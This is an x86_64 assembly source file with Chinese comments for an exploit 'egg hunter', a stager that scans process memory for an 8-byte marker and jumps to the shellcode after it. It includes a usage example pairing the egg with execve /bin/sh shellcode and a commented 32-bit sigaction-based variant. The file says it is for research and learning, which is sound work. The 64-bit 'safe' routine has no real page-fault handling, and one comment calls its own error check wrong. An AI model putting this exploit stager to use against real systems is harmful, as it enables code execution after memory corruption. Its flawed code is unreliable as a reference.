; ============================================================
; egg_hunter.asm —— Egg Hunter (Linux x86_64)
;
; 功能：在内存中搜索特定的 "egg"（标记），找到后跳转到其后的 shellcode
; 应用场景：当缓冲区有限，无法存放完整 shellcode 时，
;           将大 shellcode 放在内存其他位置，用 egg hunter 查找并执行
;
; 编译：nasm -f elf64 egg_hunter.asm -o egg_hunter.o
;
; 注意：本代码仅用于安全研究与学习目的
; ============================================================

section .text
    global _start

_start:
    ; ============================================================
    ; Egg Hunter 原理：
   ; 1. 逐页扫描内存，寻找 egg 标记（如 "EGG!" 或 0xDEADBEEF）
    ; 2. 找到 egg 后，跳转到 egg 之后执行真正的 shellcode
    ; 3. 使用访问内存时的错误检测（SIGSEGV）来跳过不可访问的页面
    ;
    ; 为什么需要逐页扫描？
    ;   - 直接逐字节扫描可能会访问不可读内存导致崩溃
    ;   - 内存页是内存保护的基本单位（通常 4096 字节）
    ;   - 检查页首地址是否可读，如果不可读则跳过整页
    ; ============================================================

    ; ---------- Egg Hunter 实现 ----------
    ; Egg: 0xDEADBEEFCAFEBABE (8字节，x86_64)
    ; 使用 scasq 指令进行比较

    xor     rcx, rcx                    ; 地址计数器 = 0
    xor     rdx, rdx
    not     rdx                         ; rdx = 0xFFFFFFFFFFFFFFFF
    ; 实际上我们会从某个地址开始扫描

egg_hunter:
    mov     rax, 0xDEADBEEFCAFEBABE     ; egg 标记
    mov     rdi, rcx                    ; 当前扫描地址
    scasq                               ; 比较 [rdi] 和 rax
    jz      egg_found                   ; 找到 egg

    ; 未找到，继续下一个地址
    inc     rcx
    jmp     egg_hunter

egg_found:
    ; rdi 现在指向 egg 之后的位置
    jmp     rdi                         ; 跳转到真正的 shellcode

; ============================================================
; 带页面检测的 Egg Hunter（更健壮的版本）
; 使用 access 系统调用检测内存页是否可读
; ============================================================

section .text
egg_hunter_safe:
    xor     rcx, rcx                    ; 起始地址 0
    mov     rdx, 0x1000                 ; 页面大小 4096

align_page:
    ; 对齐到页边界
    or      cx, 0xFFF                   ; 低12位设为1
    inc     rcx                         ; 下一页起始地址

    ; 使用 sys_access 检查地址是否可读
    ; int access(const char *pathname, int mode)
    ; mode = F_OK = 0 (检查是否存在)
    ; 但 access 是检查文件的，不能直接检查内存
    ; 所以我们用其他方法...

    ; 方法：尝试访问地址，如果触发 SIGSEGV 则跳到下一页
    ; 在实际利用中，通常使用 sigaction 或利用异常处理

    ; 简化版本：直接比较
    mov     rax, 0xDEADBEEFCAFEBABE
    mov     rdi, rcx
    scasq
    jz      egg_found_safe

    inc     rcx
    jmp     align_page

egg_found_safe:
    jmp     rdi

; ============================================================
; 使用示例：
;
; 在内存某处放置 egg + shellcode：
;
;   db  0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE, 0xBA, 0xBE  ; egg
;   ; 后面紧跟真正的 shellcode
;   db  0x48, 0x31, 0xc0, ...  ; execve /bin/sh shellcode
;
; 然后调用 egg_hunter，它会扫描内存找到 egg 并执行后续代码
;
; ============================================================

; ============================================================
; x86 32位经典 Egg Hunter（参考）
; ============================================================
;
; 原理：利用 sigaction 系统调用检测内存页
;
; egg_hunter_32:
;     or      cx, 0xFFF              ; 页对齐
; next_addr:
;     inc     ecx
;     push    byte +0x43             ; sigaction
;     pop     eax
;     int     0x80
;     cmp     al, 0xF2               ; EFAULT = 14 = 0xE? 不对
;     jz      egg_hunter_32          ; 不可读，下一页
;     mov     eax, 0xDEADBEEF        ; egg
;     mov     edi, ecx
;     scasd
;     jnz     next_addr
;     scasd                          ; 检查第二个 egg（防止匹配自身）
;     jnz     next_addr
;     jmp     edi                    ; 找到，跳转到 shellcode
;
; 为什么检查两次 egg？
;   - egg hunter 自身代码中可能包含 egg 值
;   - 检查两次可以避免误匹配到自身
;   - 通常要求 egg 出现两次连续出现
;
; ============================================================

; ============================================================
; Egg Hunter 变体与技巧：
;
; 1. 双向搜索
;    - 从堆栈地址向高地址和低地址两个方向搜索
;    - 提高命中率
;
; 2. 已知地址范围搜索
;    - 如果知道 shellcode 大致位置，缩小搜索范围
;    - 提高搜索速度
;
; 3. Egg 标记选择
;    - 选择不容易在正常代码中出现的字节序列
;    - 避免使用常见指令的操作码
;    - 可以使用独特的 8 字节标记
;
; 4. 搜索优化
;    - 先搜整页对齐地址
;    - 使用 rep scasq 加速
;
; 5. Windows 下的 Egg Hunter
;    - 使用 NtDisplayString 或 IsBadReadPtr 检测内存
;    - 利用 SEH 处理访问异常
;    - 搜索 PEB 找相关函数地址
;
; Egg Hunter 大小：
;   - 32位 Linux: ~30-40 字节
;   - 64位 Linux: ~40-60 字节
;   - Windows: 通常更大（需要找函数地址）
; ============================================================
